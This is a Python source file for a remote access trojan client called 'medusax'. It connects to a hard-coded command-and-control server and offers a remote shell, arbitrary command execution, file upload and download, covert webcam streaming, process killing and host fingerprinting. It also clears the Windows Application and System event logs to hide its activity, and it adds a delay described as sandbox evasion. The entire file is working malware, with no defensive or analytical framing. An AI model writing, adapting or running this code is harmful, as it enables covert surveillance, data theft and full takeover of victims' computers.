# medusax_c2_client.py
import socket
import subprocess
import platform
import os
import time
import threading
import uuid
import psutil
import cv2

SERVER_IP = '10.0.1.33'
SERVER_PORT = 1337
BUFFER_SIZE = 4096

# Optional AV evasion
for _ in range(3):
    time.sleep(1)  # delay to avoid sandbox detection

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))

cwd = os.getcwd()

def send_data(data):
    try:
        client.send(data.encode())
    except:
        pass

def webcam_stream(index=0):
    cam = cv2.VideoCapture(index)
    while True:
        ret, frame = cam.read()
        if ret:
            _, jpeg = cv2.imencode('.jpg', frame)
            client.send(b'WEBCAM:' + jpeg.tobytes())
        time.sleep(0.2)

def list_processes():
    return "\n".join(f"{p.pid}: {p.name()}" for p in psutil.process_iter())

def get_pcinfo():
    return f"OS: {platform.system()} {platform.release()}\nArchitecture: {platform.machine()}\nUser: {os.getlogin()}\nUUID: {uuid.getnode()}"

while True:
    try:
        command = client.recv(BUFFER_SIZE).decode()
        if command.startswith("shell"):
            parts = command.split("-d")
            shell_dir = parts[1].strip() if len(parts) > 1 else "C:\\"
            os.chdir(shell_dir)
            while True:
                client.send(b"medusax_shell> ")
                cmd = client.recv(BUFFER_SIZE).decode()
                if cmd.lower() in ["exit", "quit"]:
                    break
                output = subprocess.getoutput(cmd)
                client.send(output.encode())
        elif command == "pwd":
            send_data(os.getcwd())
        elif command.startswith("kill"):
            pid = int(command.split()[1])
            psutil.Process(pid).terminate()
            send_data(f"Process {pid} terminated")
        elif command == "pcinfo":
            send_data(get_pcinfo())
        elif command == "list":
            send_data(list_processes())
        elif command.startswith("upload"):
            parts = command.split()
            filename = parts[1]
            destination = parts[3] if "-d" in parts else "C:\\Users\\Public"
            with open(os.path.join(destination, os.path.basename(filename)), 'wb') as f:
                chunk = client.recv(BUFFER_SIZE)
                while chunk != b"DONE":
                    f.write(chunk)
                    chunk = client.recv(BUFFER_SIZE)
            send_data("File uploaded")
        elif command.startswith("download"):
            parts = command.split()
            filepath = parts[1]
            revdest = parts[3] if "-rd" in parts else ""
            with open(filepath, 'rb') as f:
                data = f.read(BUFFER_SIZE)
                while data:
                    client.send(data)
                    data = f.read(BUFFER_SIZE)
            time.sleep(1)
            client.send(b"DONE")
        elif command.startswith("webcam_stream"):
            index = 0
            if "-i" in command:
                try:
                    index = int(command.split("-i")[1].strip())
                except: pass
            threading.Thread(target=webcam_stream, args=(index,), daemon=True).start()
        elif command.startswith("run"):
            exe = command.split()[1]
            subprocess.Popen(exe, shell=True)
            send_data(f"Executed {exe}")
        elif command == "cleanev":
            subprocess.call("wevtutil cl Application && wevtutil cl System", shell=True)
            send_data("Event logs cleared")
        else:
            output = subprocess.getoutput(command)
            send_data(output)
    except Exception as e:
        try:
            send_data(f"Error: {str(e)}")
        except:
            pass
